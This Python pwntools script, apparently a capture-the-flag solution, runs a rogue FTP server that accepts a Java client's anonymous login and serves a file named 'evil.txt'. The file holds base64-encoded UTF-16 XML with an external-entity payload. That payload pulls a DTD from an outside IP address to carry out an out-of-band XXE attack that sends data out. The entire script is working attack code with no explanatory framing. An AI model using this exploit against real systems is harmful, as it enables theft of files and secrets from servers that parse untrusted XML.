from pwn import *
import base64

control = listen(21)
data = listen(3255)
controld = control.wait_for_connection()
controld.sendline(b"220 Welcome to the FTP server")
controld.sendlineafter(b"USER anonymous", b"331 Please specify the password")
controld.sendlineafter(b"PASS Java17.0.1@", b"230 Login successful, welcome!")
controld.sendlineafter(b"TYPE I", b"200 Switching to Binary mode.")
controld.sendlineafter(b"EPSV ALL", b"229 Entering Extended Passive Mode (|||3255|).")
controld.sendlineafter(b"EPSV", b"229 Entering Extended Passive Mode (|||3255|).")

datad = data.wait_for_connection()
controld.sendlineafter(f"RETR evil.txt", b"150 Opening BINARY mode data connection for evil.txt (2 bytes).")
xml_content = r'<?xml version="1.0" encoding="UTF-16"?>\n<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://124.222.21.138:22222/xxe.dtd"> %remote;%int;%send; ]>'
content = base64.b64decode("/v8APAA/AHgAbQBsACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADAAIgAgAGUAbgBjAG8AZABpAG4AZwA9ACIAVQBUAEYALQAxADYAIgA/AD4ACgA8ACEARABPAEMAVABZAFAARQAgAGMAbwBuAHYAZQByAHQAIABbACAAPAAhAEUATgBUAEkAVABZACAAJQAgAHIAZQBtAG8AdABlACAAUwBZAFMAVABFAE0AIAAiAGgAdAB0AHAAOgAvAC8AMQAyADQALgAyADIAMgAuADIAMQAuADEAMwA4ADoAMgAyADIAMgAyAC8AeAB4AGUALgBkAHQAZAAiAD4AIAAlAHIAZQBtAG8AdABlADsAJQBpAG4AdAA7ACUAcwBlAG4AZAA7ACAAXQA+".encode())
datad.send(content)
controld.sendline(b"226 Transfer complete.")
controld.sendlineafter(b"QUIT", b"221 Goodbye. Thank you for using the FTP server.")
data.close()
control.close()